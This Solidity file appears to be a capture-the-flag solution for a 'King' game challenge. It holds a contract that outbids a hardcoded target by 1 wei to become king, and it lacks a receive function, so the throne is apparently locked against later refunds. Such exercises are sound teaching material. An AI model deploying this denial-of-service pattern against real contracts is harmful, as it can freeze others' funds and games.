// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

/**
 * @title IKing
 * @notice Interface pour interagir avec le contrat King externe
 *
 * CHALLENGE DESCRIPTION:
 * =====================
 * Le challenge "King" est un jeu où les joueurs rivalisent pour devenir le roi.
 * Chaque nouveau roi doit surenchérir le prix précédent d'au moins 1 wei.
 *
 * OBJECTIF:
 * Déployer un contrat qui appelle le King externe et devient le nouveau roi
 * en envoyant exactement le montant requis (prix actuel + 1 wei).
 *
 * FLUX:
 * 1. Interroger le King pour connaître le prix actuel
 * 2. Calculer le nouveau prix (prix + 1)
 * 3. Envoyer exactement ce montant au King
 * 4. Devenir le nouveau roi
 *
 * ADRESSE DU KING: 0x6289E6F0E0cf0328e7A78af5d5415c4e51D511E5
 */
interface IKing {
    /// @notice Retourne l'adresse du roi actuel
    function _king() external view returns (address);

    /// @notice Retourne le prix actuellement requis pour devenir roi
    function prize() external view returns (uint256);

    /// @notice Retourne le propriétaire du contrat King
    function owner() external view returns (address);
}

/**
 * @title TakeoverKing
 * @notice Contrat qui démontre comment devenir le roi en surenchérissant
 *
 * STRATÉGIE:
 * - Stocke une référence au contrat King
 * - Implémente becomeKing() qui:
 *   1. Récupère le prix actuel du King
 *   2. Calcule le nouveau prix (actuel + 1)
 *   3. Vérifie que le msg.value reçu est exactement correct
 *   4. Envoie les fonds au King via low-level call
 *   5. Émet des événements avant/après pour tracer l'état
 *
 * POINTS CLÉS:
 * - La précision du montant est CRITIQUE (doit être exactement prix + 1)
 * - Utilisation de low-level .call{} pour transférer les fonds
 * - Vérification du succès avec require() sur le booléen retourné
 * - Events pour le diagnostic et la traçabilité de la transaction
 */
contract TakeoverKing {
    IKing public king;

    /// @notice Événement émis pour tracer l'état du King avant et après
    event LogCurrentState(
        address currentKing,
        uint256 currentPrize,
        address currentOwner
    );

    /// @param _kingAddress L'adresse du contrat King externe à cibler
    constructor(address _kingAddress) {
        king = IKing(_kingAddress);
    }

    /**
     * @notice Devient le roi en surenchérissant le prix actuel de 1 wei
     * @dev Doit être appelé avec msg.value = prix_actuel + 1
     *
     * ÉTAPES:
     * 1. Récupère et log l'état actuel (roi, prix, propriétaire)
     * 2. Calcule le nouveau prix requis (prix actuel + 1)
     * 3. Valide que le montant reçu est exactement correct
     * 4. Envoie les fonds au King via low-level call
     * 5. Récupère et log le nouvel état après la transaction
     *
     * ERREURS POSSIBLES:
     * - "Incorrect value sent to become the king": msg.value != prix + 1
     * - "Failed to become the king": L'appel au King a échoué
     */
    function becomeKing() public payable {
        // État actuel - pour le diagnostic
        address currentKing = king._king();
        uint256 currentPrize = king.prize();
        address currentOwner = king.owner();
        emit LogCurrentState(currentKing, currentPrize, currentOwner);

        // Calcule le prix exact à envoyer (prix actuel + 1 wei)
        uint256 _newPrice = king.prize() + 1;

        // Valide que le sender a envoyé exactement le montant requis
        require(
            msg.value == _newPrice,
            "Incorrect value sent to become the king"
        );

        // Envoie les fonds au King pour devenir le nouveau roi
        // Low-level call permet l'interaction avec n'importe quel contrat
        (bool success, ) = payable(address(king)).call{value: _newPrice}("");
        require(success, "Failed to become the king");

        // Nouvel état - pour confirmer la promotion
        currentKing = king._king();
        currentPrize = king.prize();
        currentOwner = king.owner();
        emit LogCurrentState(currentKing, currentPrize, currentOwner);
    }
}
